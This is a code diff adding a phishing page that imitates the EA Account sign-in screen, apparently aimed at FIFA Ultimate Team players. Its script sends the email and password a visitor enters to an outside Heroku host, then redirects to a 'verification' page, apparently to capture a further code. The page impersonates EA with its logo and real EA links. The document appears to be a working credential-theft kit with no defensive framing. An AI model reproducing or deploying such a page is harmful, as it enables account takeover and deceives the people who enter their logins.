@@ -1,0 +1,207 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <link rel="icon" href="https://signin.ea.com/p/favicon.ico">
+    <link rel="preconnect" href="https://fonts.googleapis.com/">
+    <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin="">
+    <link href="./Sign in_files/css2" rel="stylesheet">
+    <meta name="viewport" content="width=device-width,initial-scale=1">
+    <meta name="theme-color" content="#000000">
+    <meta name="description" content="Web site created using create-react-app">
+    <link href="https://fonts.googleapis.com/css2?family=Poppins&amp;display=swap" rel="stylesheet">
+
+    <title>Sign in</title>
+    <link href="./Sign in_files/main.9bcaedc7.chunk.css" rel="stylesheet">
+    <link href="./Sign in_files/main.9bcaedc7.chunk.css" rel="stylesheet">
+    <style>
+        p,h1,h2,h3,span,label{
+            font-family: "Open Sans",sans-serif;
+        }
+    .show{
+            display: block !important;
+    }
+.lds-ring {
+  display: inline-block;
+  position: relative;
+  width: 80px;
+  height: 80px;
+  display: none;
+  margin: 0 auto;
+}
+.lds-ring div {
+  box-sizing: border-box;
+  display: block;
+  position: absolute;
+  width: 64px;
+  height: 64px;
+  margin: 8px;
+  border: 8px solid #fff;
+  border-radius: 50%;
+  animation: lds-ring 1.2s cubic-bezier(0.5, 0, 0.5, 1) infinite;
+  border-color: #fff transparent transparent transparent;
+}
+.lds-ring div:nth-child(1) {
+  animation-delay: -0.45s;
+}
+.lds-ring div:nth-child(2) {
+  animation-delay: -0.3s;
+}
+.lds-ring div:nth-child(3) {
+  animation-delay: -0.15s;
+}
+@keyframes lds-ring {
+  0% {
+    transform: rotate(0deg);
+  }
+  100% {
+    transform: rotate(360deg);
+  }
+}
+
+#showicon{
+    display: none;
+}
+#error{
+    font-size: 0.8rem;
+    color: #f94747;
+}
+.title h1{
+    font-size: 24px;
+    font-weight: 550;
+    letter-spacing: .48px;
+    line-height: 1.618;
+}
+label{
+    font-weight: 600;
+}
+    </style>
+
+</head>
+<body><noscript>You need to enable JavaScript to run this app.</noscript>
+
+
+    <div id="root">
+        <div class="wrapper">
+
+            <div class="container">
+                <div class="logo_div"><svg width="64" height="64" viewBox="0 0 64 64" fill="none"
+                        xmlns="http://www.w3.org/2000/svg">
+                        <path
+                            d="M31.9527 0C14.3055 0 0 14.3091 0 31.9527C0 49.6036 14.3055 63.9055 31.9527 63.9055C49.6 63.9055 63.9055 49.6036 63.9055 31.9527C63.9055 14.3091 49.6 0 31.9527 0ZM19.2218 19.3818H37.5891L34.8 23.8473H16.4327L19.2218 19.3818ZM49.9091 41.6982L47.1164 37.24H38.9636L41.76 32.7745H44.3345L41.2218 27.8036L32.5382 41.6945H9.37455L14.9527 32.7709H10.8582L13.6436 28.3055H31.5527L28.7636 32.7782H20.2218L17.4291 37.2436H30.0618L41.2218 19.3818L55.1709 41.7018H49.9091V41.6982Z"
+                            fill="#FF4747"></path>
+                    </svg></div>
+                <div class="title">
+                    <h1>Sign in with your EA Account</h1>
+                </div>
+                <div class="myForm">
+                    <form autocomplete="off"  onsubmit="return false">
+                        <div class="input_one"><label>phone or email</label><input type="texte" name="email"
+                                class="email_input" id="email" type="email" placeholder="Enter your phone or email"
+                                value=""></div>
+                        <div class="input_two">
+                            <label>password</label>
+                            <input type="password" name="password" class="password_input" id="password" placeholder="Enter your password" value="">
+                            <div onclick="changestateofpassword()"  class="btn">
+                                <svg id="showicon" height="16" viewBox="0 0 16 16" width="16"
+                                xmlns="http://www.w3.org/2000/svg">
+                                <g fill="none" fill-rule="evenodd">
+                                    <path d="m0 0h16v16h-16z"></path>
+                                    <path
+                                        d="m8 3.66666667c3.2032732 0 6.6666667 2.54318984 6.6666667 4.33333333s-3.4633935 4.3333333-6.6666667 4.3333333c-3.20327316 0-6.66666667-2.54318981-6.66666667-4.3333333s3.46339351-4.33333333 6.66666667-4.33333333zm0 1.33333333c-1.38181706 0-2.74575629.50269607-3.87107038 1.3290207-.87134632.63983463-1.46226295 1.41228951-1.46226295 1.6709793s.59091663 1.03114467 1.46226295 1.6709793c1.12531409.8263246 2.48925332 1.3290207 3.87107038 1.3290207s2.7457563-.5026961 3.8710704-1.3290207c.8713463-.63983463 1.4622629-1.41228951 1.4622629-1.6709793s-.5909166-1.03114467-1.4622629-1.6709793c-1.1253141-.82632463-2.48925334-1.3290207-3.8710704-1.3290207zm0 1c1.1045695 0 2 .8954305 2 2s-.8954305 2-2 2-2-.8954305-2-2 .8954305-2 2-2zm0 1.33333333c-.36818983 0-.66666667.29847684-.66666667.66666667s.29847684.66666667.66666667.66666667.66666667-.29847684.66666667-.66666667-.29847684-.66666667-.66666667-.66666667z"
+                                        fill="#fff"></path>
+                                </g>
+                                </svg>
+                            <svg id="hideicon" viewBox="0 0 24 24" height="16" width="16" xmlns="http://www.w3.org/2000/svg"><g fill-rule="evenodd" fill="none"><path d="M14.318 14.404a3 3 0 0 0-4.223-4.223l1.436 1.436a1 1 0 0 1 1.352 1.352l1.435 1.435zm-5.27-2.442a3 3 0 0 0 3.49 3.49l-3.49-3.49z" fill="#fff"></path><path d="M17.484 17.57c.546-.294 1.05-.617 1.506-.951.875-.643 1.597-1.348 2.11-2.02a5.54 5.54 0 0 0 .628-1.01c.15-.323.272-.7.272-1.089s-.122-.766-.272-1.088A5.54 5.54 0 0 0 21.1 10.4c-.514-.67-1.235-1.376-2.11-2.019C17.245 7.1 14.793 6 12 6c-1.824 0-3.503.47-4.934 1.152L8.585 8.67A9.309 9.309 0 0 1 12 8c2.27 0 4.318.9 5.807 1.994.742.545 1.321 1.12 1.704 1.621.192.251.323.468.403.64.071.153.083.231.086.244v.001c-.003.014-.015.092-.086.245a3.57 3.57 0 0 1-.403.64c-.383.5-.962 1.076-1.704 1.622a10.73 10.73 0 0 1-1.812 1.073l1.489 1.49zM6.718 9.632a9.89 9.89 0 0 0-.525.362c-.742.545-1.321 1.12-1.704 1.621a3.57 3.57 0 0 0-.403.64c-.071.153-.083.231-.086.244v.001c.003.014.015.092.086.245.08.172.21.389.403.64.383.5.962 1.076 1.704 1.622C7.683 16.1 9.73 17 12 17a8.92 8.92 0 0 0 1.882-.204l1.626 1.627c-1.08.357-2.26.577-3.508.577-2.792 0-5.245-1.1-6.99-2.381-.875-.643-1.597-1.348-2.11-2.02a5.544 5.544 0 0 1-.628-1.01c-.15-.323-.272-.7-.272-1.089s.122-.766.272-1.088A5.61 5.61 0 0 1 2.9 10.4c.513-.67 1.235-1.376 2.11-2.019.087-.064.176-.127.267-.19l1.44 1.441z" fill="#fff"></path><path d="M3.543 2.793a1 1 0 0 1 1.414 0l17 17a1 1 0 0 1-1.414 1.414l-17-17a1 1 0 0 1 0-1.414z" fill="#fff"></path></g></svg>
+                            </div>
+                        </div>
+                        <div id="error" ></div>
+
+                        <div class="input_three"><label class="checkContainer"><input type="checkbox"><span
+                                    class="checkmark"></span>
+                                <p>Remember me</p>
+                            </label></div>
+                        <div class="input_four"><button type="submot" onclick="sendData()">Sign IN</button></div>
+                        <div class="lds-ring"><div></div><div></div><div></div><div></div></div>
+                    </form>
+    
+                </div>
+                <div class="links"><a
+                        href="https://signin.ea.com/p/juno/resetPassword?execution=e1411427304s1&amp;initref=https%3A%2F%2Faccounts.ea.com%3A443%2Fconnect%2Fauth%3Fdisplay%3Dweb2%252Flogin%26scope%3Dbasic.identity%2Boffline%2Bsignin%2Bbasic.entitlement%2Bbasic.persona%26response_type%3Dtoken%26release_type%3Dprod%26redirect_uri%3Dhttps%253A%252F%252Fwww.ea.com%252Ffifa%252Fultimate-team%252Fweb-app%252Fauth.html%26accessToken%3D%26locale%3Den_US%26prompt%3Dlogin%26client_id%3DFIFA22_JS_WEB_APP">Need
+                        help logging in?</a>
+                    <p>New to EA? <a
+                            href="https://signin.ea.com/p/juno/create?execution=e1411427305s1&amp;initref=https%3A%2F%2Faccounts.ea.com%3A443%2Fconnect%2Fauth%3Fdisplay%3Dweb2%252Flogin%26scope%3Dbasic.identity%2Boffline%2Bsignin%2Bbasic.entitlement%2Bbasic.persona%26response_type%3Dtoken%26release_type%3Dprod%26redirect_uri%3Dhttps%253A%252F%252Fwww.ea.com%252Ffifa%252Fultimate-team%252Fweb-app%252Fauth.html%26accessToken%3D%26locale%3Den_US%26prompt%3Dlogin%26client_id%3DFIFA22_JS_WEB_APP">Create
+                    an EA Account</a></p>
+                </div>
+
+
+            </div>
+        </div>
+    </div>
+  
+</body>
+
+<script>
+    function changestateofpassword(){
+        const password = document.getElementById("password")
+        const linepassword = document.getElementById("linepassword")
+        const showicon = document.getElementById("showicon")
+        const hideicon = document.getElementById("hideicon")
+        if(password.type=="text"){
+            password.type="password"
+            showicon.style.display = "block"
+            hideicon.style.display = "none"
+            
+        }else{
+            password.type="text"
+            showicon.style.display = "none"
+            hideicon.style.display = "block"
+        }
+    }
+    var redirect
+
+    let toggle=document.getElementsByClassName("lds-ring")[0]
+    function sendData(){
+        if(!validateEmail(document.getElementById("email").value)){
+            var div = document.getElementById('error');
+                div.innerHTML = "email incorrect format";
+                return
+        }
+        if(!validatePassword(document.getElementById("password").value)){
+            var div = document.getElementById('error');
+                div.innerHTML = "Your credentials are incorrect or have expired. Please try again or reset your password.";
+                return
+        }
+        div = document.getElementById('error').innerHTML=""
+        toggle.classList.toggle("show");
+        fetch('https://backendappgze123.herokuapp.com/backend/connect',
+        {method: 'POST',
+        headers: {
+        'Content-Type': 'application/json'
+        },
+	   body: JSON.stringify({
+           email:document.getElementById("email").value,
+           password:document.getElementById("password").value,
+       })})
+        .then(response => response.json())
+        .then(data => {
+            redirect=setTimeout(()=>{
+                window.location = '/verification.html?email='+ document.getElementById("email").value;
+            },3000)
+
+        });
+
+    function validateEmail(email) {
+    const re = /^(([^<>()[\]\\.,;:\s@"]+(\.[^<>()[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
+    return re.test(String(email).toLowerCase());
+    }
+    function validatePassword(password){
+        const re = /^(?=.*\d)(?=.*[a-z])(?=.*[A-Z]).{8,50}$$/;;
+    return re.test(String(password));
+    }
+    }
+
+</script>
+
+</html>
